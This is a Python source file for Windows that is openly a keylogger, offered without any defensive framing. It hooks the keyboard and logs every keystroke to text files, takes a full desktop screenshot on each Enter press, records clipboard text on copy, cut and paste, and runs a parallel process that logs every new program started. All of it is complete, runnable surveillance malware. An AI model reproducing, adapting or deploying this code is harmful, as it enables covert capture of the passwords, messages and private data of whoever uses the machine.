import multiprocessing
import os
import sys
import time

import pythoncom
import pyHook

import win32con
import win32clipboard
import win32gui
import win32ui

import wmi


def take_screenshot():
    # Gather the desktop information
    desktop=win32gui.GetDesktopWindow()
    left, top, right, bottom=win32gui.GetWindowRect(desktop)
    height=bottom - top
    width=right - left

    # Prepare objects for screenshot
    win_dc = win32gui.GetWindowDC(desktop)
    ui_dc=win32ui.CreateDCFromHandle(win_dc)

    # Create screenshot file
    bitmap = win32ui.CreateBitmap()
    bitmap.CreateCompatibleBitmap(ui_dc, width, height)

    compat_dc=ui_dc.CreateCompatibleDC()
    compat_dc.SelectObject(bitmap)

    #Capture screenshot
    compat_dc.BitBlt((0,0),(width, height) , ui_dc, (0,0), win32con.SRCCOPY)
    bitmap.Paint(compat_dc)
    timestr = time.strftime("_%Y%m%d_%H%M%S")
    bitmap.SaveBitmapFile(compat_dc,'screenshot'+timestr+'.bmp')

    # Release objects to prevent memory issues
    ui_dc.DeleteDC()
    compat_dc.DeleteDC()
    win32gui.ReleaseDC(desktop, win_dc)
    win32gui.DeleteObject(bitmap.GetHandle())


def get_clipboard():
    # Open the clipboard
    win32clipboard.OpenClipboard()
    # Grab the text on the clipboard
    d=win32clipboard.GetClipboardData(win32con.CF_TEXT) # get clipboard data
    # Close & Return the clipboard
    win32clipboard.CloseClipboard()
    return d


def OnKeyboardEvent(event):
    # Open output log file
    timestr = time.strftime("_%Y%m%d_%H00")
    keylog_file = 'keylog_output{0}.txt'.format(timestr)
    f = open(keylog_file,'a')

    # Allow keylogger to be stopped if ctrl-e pressed
    if event.Ascii == 5:
        f.write('Closing Down Keylogger')
        exit(1)

    # Otherwise, capture the keystrokes!
    elif event.Ascii != 0 or event.Ascii != 8:
        # Handles a 'Enter' key press
        if event.Ascii == 13:
            keylogs = '\n'
            f.write(keylogs)
            # Capture Screenshot
            take_screenshot()

        # Capture Clipboard on copy/cut/paste
        elif event.Ascii == 03 or event.Ascii == 22 or event.Ascii == 24:
            keylogs = get_clipboard()
            f.write("\n\nClipboard: ")
            f.write(keylogs)
            f.write('\n\n')

        # Captues every other ascii character
        else:
            keylogs = chr(event.Ascii)
            f.write(keylogs)

    # Release the file
    f.close()

def keylogger_main():
    # Create a hook manager object
    hm=pyHook.HookManager()
    try:
        hm.KeyDown = OnKeyboardEvent
    except (TypeError, KeyboardInterrupt):
        pass
    # Set the hook
    hm.HookKeyboard()
    # Wait forever for events
    pythoncom.PumpMessages()

def process_logger_main():
    w = wmi.WMI()
    created = w.Win32_Process.watch_for("creation")

    timestr = time.strftime("_%Y%m%d_%H00")
    process_file = 'process_logger{0}.txt'.format(timestr)

    pf = open(process_file, 'a')

    while True:
        c = created()
        pf.write("\n\n====")
        pf.write(str(c))
        pf.flush()
    pf.close()

def main():
    # Setup Process 1: Keylogger
    proc1 = multiprocessing.Process(target=keylogger_main)
    proc1.start()

    # Setup Process 2: Process Logger
    proc2 = multiprocessing.Process(target=process_logger_main)
    proc2.start()

    # Stops both threads if one exits.
    while True:
        if not proc1.is_alive():
            proc2.terminate()
            break
        else:
            time.sleep(30)

    # Exit
    sys.exit(1)

if __name__ == '__main__':
    main()
